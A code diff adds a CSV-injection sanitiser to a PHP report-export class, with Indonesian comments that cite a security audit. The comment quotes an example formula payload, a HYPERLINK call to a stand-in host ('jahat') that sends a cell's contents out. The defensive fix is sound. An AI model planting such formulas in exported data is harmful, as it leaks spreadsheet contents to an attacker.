@@ -380,17 +380,55 @@ class Laporan extends Page
             // BOM agar Excel membaca UTF-8 dengan benar
             fwrite($out, "\xEF\xBB\xBF");
 
-            fputcsv($out, [$judul], ';');
+            fputcsv($out, [self::amanCsv($judul)], ';');
             fputcsv($out, ['Dicetak: '.now()->format('d/m/Y H:i')], ';');
             fputcsv($out, [], ';');
-            fputcsv($out, $header, ';');
+            fputcsv($out, array_map(self::amanCsv(...), $header), ';');
 
             foreach ($baris as $r) {
-                fputcsv($out, $r, ';');
+                fputcsv($out, array_map(self::amanCsv(...), (array) $r), ';');
             }
 
             fclose($out);
         }, $namaFile, ['Content-Type' => 'text/csv; charset=UTF-8']);
+    }
+
+    /**
+     * Cegah CSV INJECTION.
+     *
+     * ⚠️ TEMUAN AUDIT KEAMANAN:
+     * Kalau sebuah sel dimulai dengan `=`, `+`, `-`, atau `@`, Excel/Calc
+     * menganggapnya RUMUS dan menjalankannya. Contohnya nama pekerjaan
+     * "=HYPERLINK(""http://jahat/?x=""&A1)" bisa mencuri data, dan pada
+     * Excel lama rumus DDE bisa menjalankan perintah.
+     *
+     * Karena file CSV ini dibuka di Excel (aplikasi yang dipakai
+     * perusahaan), nilai dari database HARUS dinetralkan dulu.
+     *
+     * Cara: beri awalan apostrof (`'`) pada nilai teks yang diawali
+     * karakter berbahaya. Excel akan menampilkannya sebagai teks biasa.
+     * Angka asli (int/float) TIDAK disentuh supaya tetap bisa dihitung.
+     */
+    private static function amanCsv(mixed $nilai): mixed
+    {
+        // Angka & null: biarkan apa adanya (aman, dan tetap bisa dijumlahkan).
+        if ($nilai === null || is_int($nilai) || is_float($nilai)) {
+            return $nilai;
+        }
+
+        $teks = (string) $nilai;
+
+        if ($teks === '') {
+            return $teks;
+        }
+
+        // Karakter yang memicu rumus di Excel/Calc.
+        // Termasuk TAB (0x09) & CR (0x0D) karena bisa dipakai menyusupkan.
+        if (preg_match('/^[=+\-@\t\r]/', $teks) === 1) {
+            return "'".$teks;
+        }
+
+        return $teks;
     }
 
     /**
